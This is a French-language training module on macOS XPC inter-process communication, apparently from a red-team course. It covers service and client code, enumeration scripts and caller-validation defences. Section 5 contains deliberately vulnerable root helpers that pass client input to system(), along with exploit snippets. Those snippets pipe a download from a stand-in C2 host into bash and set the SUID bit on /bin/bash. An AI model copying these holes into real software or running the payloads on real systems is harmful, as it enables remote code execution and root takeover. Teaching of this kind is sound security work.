# Module M06 : XPC Basics - Communication Inter-Processus Moderne sur macOS

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre XPC (XPC Services) et son architecture
- Créer des services XPC et clients XPC en C/Objective-C
- Communiquer entre processus via XPC
- Exploiter les vulnérabilités XPC courantes
- Identifier les vecteurs d'attaque XPC en Red Team

## 1. Introduction à XPC

### 1.1 Qu'est-ce que XPC ?

Imaginez un **restaurant avec guichet** :
- La **cuisine** (service XPC) prépare les plats mais est isolée
- Le **guichet** (XPC connection) transmet les commandes
- Le **client** (app) passe commande et reçoit le plat

**XPC** (Cross-Process Communication) = framework Apple moderne pour IPC sécurisé, construit sur Mach Ports mais avec API haut-niveau.

```ascii
ANALOGIE : RESTAURANT AVEC GUICHET

┌─────────────────────────────────────────────────┐
│              CLIENT (Application)               │
│  "Je veux un hamburger"                         │
└────────────────┬────────────────────────────────┘
                 │
                 │ XPC Message
                 │ xpc_dictionary_create()
                 ▼
┌─────────────────────────────────────────────────┐
│           GUICHET (XPC Connection)              │
│  - Sérialise message                            │
│  - Vérifie droits (entitlements)                │
│  - Transmet à service                           │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│         CUISINE (XPC Service)                   │
│  - Reçoit commande                              │
│  - Prépare hamburger                            │
│  - Retourne via XPC Reply                       │
└─────────────────────────────────────────────────┘
```

### 1.2 XPC vs Mach Ports

```ascii
COMPARAISON

┌────────────────────┬─────────────────┬─────────────────┐
│                    │   MACH PORTS    │      XPC        │
├────────────────────┼─────────────────┼─────────────────┤
│ Niveau             │ Bas niveau      │ Haut niveau     │
│ API                │ mach_msg()      │ xpc_connection  │
│ Sérialisation      │ Manuelle        │ Automatique     │
│ Sécurité           │ Basique         │ Sandboxing      │
│ Code Signing       │ Non intégré     │ Vérification    │
│ Complexité         │ Élevée          │ Modérée         │
│ Performance        │ Maximale        │ Bonne           │
└────────────────────┴─────────────────┴─────────────────┘

XPC = abstraction moderne au-dessus de Mach
```

### 1.3 Pourquoi XPC en Offensive Security ?

**Défensif** :
- Isolation : services XPC = sandboxés
- Principle of Least Privilege
- Auditabilité des communications

**Offensif** :
- **XPC Injection** : exploiter services XPC vulnérables
- **Privilege Escalation** : abuser de services XPC privilégiés
- **Bypass Sandbox** : utiliser XPC services pour sortir du sandbox
- **Reconnaissance** : énumérer services XPC = découvrir architecture

## 2. Concepts Fondamentaux

### 2.1 Architecture XPC

```ascii
COMPOSANTS XPC

┌─────────────────────────────────────────────────┐
│                 APPLICATION                     │
│  MyApp.app/Contents/MacOS/MyApp                 │
│                                                 │
│  ┌───────────────────────────────────┐          │
│  │    XPC CLIENT CODE                │          │
│  │                                   │          │
│  │  connection = xpc_connection_    │          │
│  │    create_mach_service(...)       │          │
│  │                                   │          │
│  │  xpc_connection_send_message()    │          │
│  └───────────────┬───────────────────┘          │
└──────────────────┼──────────────────────────────┘
                   │
                   │ XPC Message
                   │
┌──────────────────▼──────────────────────────────┐
│         XPC SERVICE (Helper Tool)               │
│  MyApp.app/Contents/XPCServices/               │
│    MyService.xpc/Contents/MacOS/MyService       │
│                                                 │
│  ┌───────────────────────────────────┐          │
│  │    XPC SERVICE CODE               │          │
│  │                                   │          │
│  │  xpc_main(event_handler)          │          │
│  │                                   │          │
│  │  void event_handler(event) {      │          │
│  │    // Traiter message             │          │
│  │    xpc_connection_send_message()  │          │
│  │  }                                │          │
│  └───────────────────────────────────┘          │
└─────────────────────────────────────────────────┘

ISOLATION :
- Service tourne dans processus séparé
- Sandbox propre au service
- Crash service ≠ crash app
```

### 2.2 Types de Données XPC

XPC supporte plusieurs types de données :

```ascii
TYPES XPC

┌──────────────────────────────────────────────┐
│ XPC_TYPE_DICTIONARY  (clé-valeur)           │
│   → Équivalent JSON/plist                   │
│   → Usage principal pour messages           │
├──────────────────────────────────────────────┤
│ XPC_TYPE_STRING      (chaîne)               │
│   → Texte UTF-8                             │
├──────────────────────────────────────────────┤
│ XPC_TYPE_INT64       (entier)               │
│   → Nombres entiers 64-bit                  │
├──────────────────────────────────────────────┤
│ XPC_TYPE_BOOL        (booléen)              │
│   → true/false                              │
├──────────────────────────────────────────────┤
│ XPC_TYPE_DATA        (données brutes)       │
│   → Bytes arbitraires                       │
├──────────────────────────────────────────────┤
│ XPC_TYPE_ARRAY       (tableau)              │
│   → Liste ordonnée                          │
├──────────────────────────────────────────────┤
│ XPC_TYPE_FD          (file descriptor)      │
│   → Passer FD entre processus !             │
└──────────────────────────────────────────────┘
```

### 2.3 Flux de Communication XPC

```ascii
CLIENT → SERVICE

1. Créer connexion
   xpc_connection_create_mach_service()

2. Définir event handler (pour réponses)
   xpc_connection_set_event_handler()

3. Activer connexion
   xpc_connection_resume()

4. Créer message (dictionary)
   xpc_dictionary_create()
   xpc_dictionary_set_string(msg, "command", "hello")

5. Envoyer message avec reply handler
   xpc_connection_send_message_with_reply()

───────────────────────────────────────────

SERVICE (réception)

1. Main loop
   xpc_main(event_handler)

2. Event handler reçoit new connections
   if (type == XPC_TYPE_CONNECTION)

3. Pour chaque connexion, handler de messages
   xpc_connection_set_event_handler()

4. Recevoir message
   if (type == XPC_TYPE_DICTIONARY)

5. Traiter et répondre
   xpc_dictionary_get_string(msg, "command")
   xpc_connection_send_message(reply)
```

## 3. Mise en Pratique - Code C/Objective-C

### 3.1 Créer un Service XPC Simple

**Structure de projet** :
```
MyApp.app/
├── Contents/
│   ├── MacOS/
│   │   └── MyApp              (client)
│   └── XPCServices/
│       └── com.example.myservice.xpc/
│           ├── Contents/
│           │   ├── Info.plist
│           │   └── MacOS/
│           │       └── com.example.myservice
```

**Service XPC (com.example.myservice.c)** :

```c
#include <xpc/xpc.h>
#include <stdio.h>

static void handle_message(xpc_connection_t peer, xpc_object_t event) {
    if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
        // Extraire commande
        const char *command = xpc_dictionary_get_string(event, "command");

        printf("[SERVICE] Reçu commande : %s\n", command);

        // Créer réponse
        xpc_object_t reply = xpc_dictionary_create_reply(event);

        if (strcmp(command, "ping") == 0) {
            xpc_dictionary_set_string(reply, "response", "pong");
        } else if (strcmp(command, "add") == 0) {
            int64_t a = xpc_dictionary_get_int64(event, "a");
            int64_t b = xpc_dictionary_get_int64(event, "b");
            xpc_dictionary_set_int64(reply, "result", a + b);
        } else {
            xpc_dictionary_set_string(reply, "error", "Unknown command");
        }

        // Envoyer réponse
        xpc_connection_send_message(peer, reply);
        xpc_release(reply);
    }
}

static void handle_connection(xpc_connection_t peer) {
    printf("[SERVICE] Nouvelle connexion\n");

    xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
        handle_message(peer, event);
    });

    xpc_connection_resume(peer);
}

int main(int argc, const char *argv[]) {
    printf("[SERVICE] Démarrage service XPC\n");

    xpc_main(^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);

        if (type == XPC_TYPE_CONNECTION) {
            handle_connection((xpc_connection_t)event);
        }
    });

    return 0;
}
```

Compiler :
```bash
clang -framework Foundation -o com.example.myservice com.example.myservice.c
```

**Info.plist du service** :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.example.myservice</string>
    <key>CFBundleName</key>
    <string>MyService</string>
    <key>XPCService</key>
    <dict>
        <key>ServiceType</key>
        <string>Application</string>
    </dict>
</dict>
</plist>
```

### 3.2 Client XPC (Objective-C)

```objective-c
#import <Foundation/Foundation.h>

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        // Créer connexion au service
        NSXPCConnection *connection = [[NSXPCConnection alloc]
            initWithMachServiceName:@"com.example.myservice"
            options:NSXPCConnectionPrivileged];

        // Démarrer connexion
        [connection resume];

        // Créer message
        xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(message, "command", "ping");

        // Envoyer avec handler de réponse
        xpc_connection_send_message_with_reply(
            connection.xpcConnection,
            message,
            dispatch_get_main_queue(),
            ^(xpc_object_t reply) {
                const char *response = xpc_dictionary_get_string(reply, "response");
                printf("[CLIENT] Réponse : %s\n", response);
            }
        );

        xpc_release(message);

        // Attendre réponse
        [[NSRunLoop currentRunLoop] run];
    }
    return 0;
}
```

### 3.3 Client XPC en C Pur

```c
#include <xpc/xpc.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

int main() {
    // Créer connexion
    xpc_connection_t connection = xpc_connection_create_mach_service(
        "com.example.myservice",
        NULL,
        XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
    );

    // Handler d'événements
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);

        if (type == XPC_TYPE_ERROR) {
            if (event == XPC_ERROR_CONNECTION_INVALID) {
                printf("[CLIENT] Connexion invalide\n");
            } else if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
                printf("[CLIENT] Connexion interrompue\n");
            }
        }
    });

    // Activer connexion
    xpc_connection_resume(connection);

    // Créer message
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "command", "add");
    xpc_dictionary_set_int64(message, "a", 42);
    xpc_dictionary_set_int64(message, "b", 13);

    // Envoyer avec réponse synchrone
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
        connection,
        message
    );

    if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
        int64_t result = xpc_dictionary_get_int64(reply, "result");
        printf("[CLIENT] Résultat : %lld\n", result);
    }

    xpc_release(message);
    xpc_release(reply);
    xpc_release(connection);

    return 0;
}
```

Compiler :
```bash
clang -framework Foundation client.c -o client
```

## 4. Énumération et Reconnaissance XPC

### 4.1 Lister Services XPC d'une Application

```bash
# Trouver services XPC dans .app bundle
find /Applications/Safari.app -name "*.xpc"

# Exemple sortie :
# /Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SearchHelper.xpc
# /Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc
```

### 4.2 Analyser Info.plist d'un Service XPC

```bash
# Lire configuration XPC
plutil -p /Applications/Safari.app/Contents/XPCServices/\
  com.apple.Safari.SearchHelper.xpc/Contents/Info.plist

# Chercher :
# - ServiceType (Application, System)
# - RunLoopType
# - JoinExistingSession
```

### 4.3 Intercepter Communications XPC (MITM)

Utiliser **dtrace** ou **Endpoint Security** pour monitorer :

```bash
# DTrace script pour tracer XPC
sudo dtrace -n '
xpc$target:::message-send
{
    printf("XPC Send: %s -> %s\n",
           copyinstr(arg0), copyinstr(arg1));
}
xpc$target:::message-receive
{
    printf("XPC Recv: %s\n", copyinstr(arg0));
}
' -p <PID>
```

## 5. Applications Offensives

### 5.1 XPC Injection - Exploiter Validation Manquante

**Vulnérabilité** : Service XPC qui ne valide pas l'appelant.

```c
// SERVICE VULNÉRABLE (pas de vérification)
static void handle_message(xpc_connection_t peer, xpc_object_t event) {
    const char *command = xpc_dictionary_get_string(event, "command");

    if (strcmp(command, "execute") == 0) {
        const char *cmd = xpc_dictionary_get_string(event, "cmd");

        // VULNÉRABLE : exécute n'importe quelle commande !
        system(cmd);
    }
}
```

**Exploitation** :

```c
// MALWARE : se connecte au service vulnérable
xpc_connection_t conn = xpc_connection_create_mach_service(
    "com.victim.vulnservice", NULL, 0
);

xpc_connection_resume(conn);

xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(msg, "command", "execute");
xpc_dictionary_set_string(msg, "cmd", "curl http://c2.com/beacon | bash");

xpc_connection_send_message(conn, msg);
```

### 5.2 Privilege Escalation via XPC

Scénario : Service XPC tourne avec privilèges root.

```c
// Service root avec commande shell
// com.victim.roothelper.xpc (tourne en root)

static void handle_message(xpc_connection_t peer, xpc_object_t event) {
    // Vérification faible
    audit_token_t token;
    xpc_connection_get_audit_token(peer, &token);

    pid_t pid = audit_token_to_pid(token);

    // VULNÉRABLE : vérifie juste que PID existe
    if (pid > 0) {
        const char *cmd = xpc_dictionary_get_string(event, "cmd");

        // Exécute en ROOT !
        setuid(0);
        system(cmd);
    }
}
```

**Exploitation** :

```c
// N'importe quel processus utilisateur peut appeler
xpc_connection_t conn = xpc_connection_create_mach_service(
    "com.victim.roothelper", NULL, 0
);
xpc_connection_resume(conn);

xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(msg, "cmd", "chmod +s /bin/bash");

xpc_connection_send_message(conn, msg);

// Maintenant /bin/bash est SUID root !
```

### 5.3 Sandbox Escape via XPC

Service XPC hors sandbox peut effectuer actions pour app sandboxée.

```c
// App sandboxée ne peut pas écrire /tmp
// Mais service XPC non-sandboxé peut

xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(msg, "command", "write_file");
xpc_dictionary_set_string(msg, "path", "/tmp/malware");
xpc_dictionary_set_data(msg, "data", payload, payload_len);

// Service XPC écrit fichier pour nous
xpc_connection_send_message(connection, msg);
```

### 5.4 Énumération de Services XPC pour Reconnaissance

```bash
#!/bin/bash
# Script d'énumération XPC

echo "[*] Énumération services XPC système"

# Chercher tous les .xpc
find /System/Library -name "*.xpc" 2>/dev/null | while read xpc; do
    name=$(basename "$xpc" .xpc)

    # Vérifier si service démarre au boot
    plist="$xpc/Contents/Info.plist"
    if [ -f "$plist" ]; then
        type=$(plutil -extract XPCService.ServiceType raw "$plist" 2>/dev/null)
        echo "[+] $name - Type: $type"

        # Chercher entitlements intéressants
        entitlements=$(codesign -d --entitlements :- "$xpc" 2>/dev/null)
        if echo "$entitlements" | grep -q "com.apple.private"; then
            echo "    [!] Entitlements privés détectés"
        fi
    fi
done
```

## 6. Sécurisation XPC (Défense)

### 6.1 Valider l'Appelant

```c
#include <bsm/libbsm.h>

bool verify_client(xpc_connection_t peer) {
    audit_token_t token;
    xpc_connection_get_audit_token(peer, &token);

    // Vérifier PID
    pid_t pid = audit_token_to_pid(token);

    // Vérifier UID
    uid_t uid = audit_token_to_ruid(token);
    if (uid != 0) {
        printf("[-] Client non-root rejeté\n");
        return false;
    }

    // Vérifier code signature
    SecCodeRef code = NULL;
    CFDictionaryRef attrs = CFDictionaryCreate(NULL,
        (const void **)&kSecGuestAttributePid,
        (const void **)&pid, 1,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    if (SecCodeCopyGuestWithAttributes(NULL, attrs, kSecCSDefaultFlags, &code) == 0) {
        // Vérifier identité
        CFStringRef requirement = CFSTR("identifier \"com.example.trustedapp\"");
        SecRequirementRef req;
        SecRequirementCreateWithString(requirement, kSecCSDefaultFlags, &req);

        if (SecCodeCheckValidity(code, kSecCSDefaultFlags, req) != 0) {
            printf("[-] Client non-autorisé\n");
            CFRelease(code);
            CFRelease(req);
            return false;
        }
    }

    return true;
}
```

### 6.2 Limiter Surface d'Attaque

```c
// Whitelist de commandes
const char *allowed_commands[] = {
    "ping",
    "get_info",
    "set_config",
    NULL
};

bool is_command_allowed(const char *cmd) {
    for (int i = 0; allowed_commands[i]; i++) {
        if (strcmp(cmd, allowed_commands[i]) == 0) {
            return true;
        }
    }
    return false;
}

static void handle_message(xpc_connection_t peer, xpc_object_t event) {
    const char *command = xpc_dictionary_get_string(event, "command");

    if (!is_command_allowed(command)) {
        printf("[-] Commande non autorisée : %s\n", command);
        return;
    }

    // Traiter commande autorisée
}
```

## 7. Checklist Compétences

Avant de passer au module suivant, vérifiez que vous savez :

- [ ] Expliquer XPC et ses avantages vs Mach Ports
- [ ] Créer un service XPC simple en C
- [ ] Créer un client XPC communiquant avec un service
- [ ] Utiliser xpc_dictionary pour sérialiser données
- [ ] Énumérer services XPC d'une application
- [ ] Identifier vulnérabilités XPC courantes
- [ ] Valider l'identité d'un appelant XPC
- [ ] Comprendre sandbox escape via XPC

## 8. Exercices

Voir [exercice.md](exercice.md)

## 9. Ressources

- [XPC Services - Apple Developer](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
- [xpc.h Header](https://opensource.apple.com/source/xnu/xnu-4570.1.46/libsyscall/wrappers/libproc/libproc.h)
- [Attacking XPC Services](https://wojciechregula.blog/post/learn-xpc-exploitation-part-1-broken-cryptography/)
- [Objective-See - XPC Analysis](https://objective-see.com/blog/blog_0x4B.html)
- [Blackhat - macOS XPC Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Krstic.pdf)

---

**Navigation**
- [Module précédent](../M05_codesigning/)
- [Module suivant](../../PHASE_M02_MACOS_INTERNALS/M07_tcc/)
